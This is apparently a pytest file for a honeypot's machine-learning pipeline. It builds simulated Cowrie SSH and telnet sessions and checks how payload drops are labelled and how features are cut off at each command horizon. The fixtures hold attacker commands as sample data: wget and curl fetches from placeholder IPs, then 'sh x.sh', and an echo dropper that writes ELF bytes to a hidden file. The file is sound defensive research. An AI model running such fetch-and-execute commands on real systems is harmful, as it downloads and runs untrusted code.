import datetime as dt

import polars as pl
import pytest

from honeypot.analysis.ml.payload.sessions import (
    NUMERIC_BLOCKS,
    TOKEN_BLOCKS,
    horizon_rows,
    population,
    session_table,
)
from honeypot.analysis.ml.tests.fixtures import ML_EVENT_SCHEMA, _event

_T0 = dt.datetime(2026, 8, 1, 12, tzinfo=dt.UTC)
_LONG_HEX = "\\x7f\\x45\\x4c\\x46" * 10


def _session(
    session: str,
    protocol: str,
    *,
    login: bool = True,
    failed: int = 0,
    commands: tuple[str, ...] = (),
    after: tuple[str, ...] = (),
    start: int = 0,
) -> list[dict]:
    """connect, `failed` failed logins, a success (if `login`), the
    commands, then `after` events (transfers etc.), then closed."""
    src_ip = f"10.0.0.{len(session)}"
    clock = iter(_T0 + dt.timedelta(minutes=start, seconds=s) for s in range(1000))
    rows = [_event(session, "cowrie.session.connect", src_ip, next(clock), protocol)]
    if protocol == "ssh":
        rows.append(
            _event(
                session,
                "cowrie.client.version",
                src_ip,
                next(clock),
                protocol,
                version="SSH-2.0-Go",
            )
        )
    for i in range(failed):
        rows.append(
            _event(
                session,
                "cowrie.login.failed",
                src_ip,
                next(clock),
                protocol,
                username=f"u{i}",
                password="x",
            )
        )
    if login:
        rows.append(
            _event(
                session,
                "cowrie.login.success",
                src_ip,
                next(clock),
                protocol,
                username="root",
                password="root",
            )
        )
    for command in commands:
        rows.append(
            _event(
                session,
                "cowrie.command.input",
                src_ip,
                next(clock),
                protocol,
                command_input=command,
            )
        )
    for eventid in after:
        rows.append(_event(session, eventid, src_ip, next(clock), protocol))
    rows.append(_event(session, "cowrie.session.closed", src_ip, next(clock), protocol))
    return rows


def _events(*sessions: list[dict]) -> pl.DataFrame:
    return pl.DataFrame(
        [row for rows in sessions for row in rows], schema=ML_EVENT_SCHEMA
    )


@pytest.fixture
def events() -> pl.DataFrame:
    return _events(
        _session(
            "fetch",
            "telnet",
            failed=2,
            commands=("enable", "wget http://1.2.3.4/x.sh", "sh x.sh"),
            start=1,
        ),
        _session(
            "probe", "ssh", commands=("/bin/busybox wget; /bin/busybox STC",), start=2
        ),
        _session("upload", "ssh", after=("cowrie.session.file_upload",), start=3),
        _session("nologin", "ssh", login=False, failed=3, start=4),
        _session(
            "liveness", "telnet", commands=('echo -e "\\x6F\\x6B"', "ls", "id"), start=5
        ),
        _session(
            "echo",
            "telnet",
            commands=("cd /tmp", f"echo -ne '{_LONG_HEX}' > .d"),
            start=6,
        ),
        _session("scp", "ssh", commands=("scp -i k dlr@5.6.7.8:sh out",), start=7),
        _session(
            "late",
            "ssh",
            commands=("uname -a", "ls", "curl -O http://9.9.9.9/a"),
            after=("cowrie.session.file_download",),
            start=8,
        ),
    )


def _by_session(table: pl.DataFrame) -> dict[str, dict]:
    return {row["session"]: row for row in table.iter_rows(named=True)}


def test_label_position_and_kind(events) -> None:
    table = _by_session(session_table(events))
    assert "nologin" not in table
    expected = {
        "fetch": (True, 1, "fetch"),
        "probe": (False, None, None),
        "upload": (True, 0, "transfer"),
        "liveness": (False, None, None),
        "echo": (True, 1, "echo_dropper"),
        "scp": (True, 0, "scp"),
        "late": (True, 2, "fetch"),
    }
    for session, (dropped, position, kind) in expected.items():
        row = table[session]
        assert (row["dropped"], row["drop_position"], row["drop_kind"]) == (
            dropped,
            position,
            kind,
        ), session


def test_population_drops_decided_and_short_sessions(events) -> None:
    table = session_table(events)
    members = {k: set(population(table, k)["session"].to_list()) for k in (0, 1, 2)}
    assert members[0] == set(table["session"].to_list())
    # Dropped at command 0 (upload, scp) or ran no command: gone at k = 1.
    assert members[1] == {"fetch", "probe", "liveness", "echo", "late"}
    # fetch / echo dropped at command 1, probe ran one command only.
    assert members[2] == {"liveness", "late"}


def test_features_stop_at_the_cutoff(events) -> None:
    table = session_table(events)
    rows = {k: _by_session(horizon_rows(events, table, k)) for k in (0, 1, 2)}

    assert rows[0]["fetch"]["commands"] == []
    assert rows[1]["fetch"]["commands"] == ["enable"]
    assert rows[2]["late"]["commands"] == ["uname -a", "ls"]
    assert rows[0]["fetch"]["log_seconds_since_login"] == 0
    assert rows[1]["fetch"]["log_seconds_since_login"] > 0
    assert rows[0]["fetch"]["log_failed_before_login"] > 0
    assert rows[0]["probe"]["first_try_login"] == 1.0
    assert "pair=root:root" in rows[0]["fetch"]["credentials"]
    assert "version=SSH-2.0-Go" in rows[0]["probe"]["client"]
    assert rows[0]["fetch"]["context"] == ["protocol=telnet", "node=agent_detector"]
    for k, by_session in rows.items():
        frame = pl.DataFrame(list(by_session.values()))
        assert set(TOKEN_BLOCKS) <= set(frame.columns), k
        for columns in NUMERIC_BLOCKS.values():
            assert frame.select(columns).null_count().sum_horizontal()[0] == 0, k


def test_nothing_after_the_cutoff_changes_the_features(events) -> None:
    table = session_table(events)
    later = events.filter(
        (pl.col("session") == "late") & (pl.col("eventid") != "cowrie.session.closed")
    )
    # Same session with extra commands and a download after command 2, and
    # a much longer tail: the horizon-2 row must not change.
    changed = pl.concat(
        [
            events.filter(pl.col("session") != "late"),
            later,
            _events(
                [
                    row
                    | {
                        "event_timestamp": row["event_timestamp"]
                        + dt.timedelta(hours=1),
                        "command_input": "wget http://8.8.8.8/b",
                    }
                    for row in later.filter(
                        pl.col("eventid") == "cowrie.command.input"
                    ).iter_rows(named=True)
                ]
            ),
        ]
    )
    before = horizon_rows(events, table, 2).filter(pl.col("session") == "late")
    after = horizon_rows(changed, session_table(changed), 2).filter(
        pl.col("session") == "late"
    )
    assert before.drop("n_commands").equals(after.drop("n_commands"))


def test_network_block_from_enrichment(events) -> None:
    table = session_table(events).with_columns(
        pl.lit("NL").alias("country"), pl.lit("DigitalOcean, LLC").alias("as_label")
    )
    row = horizon_rows(events, table, 0).row(0, named=True)
    assert row["network"] == ["country=NL", "as=digitalocean", "as=llc"]
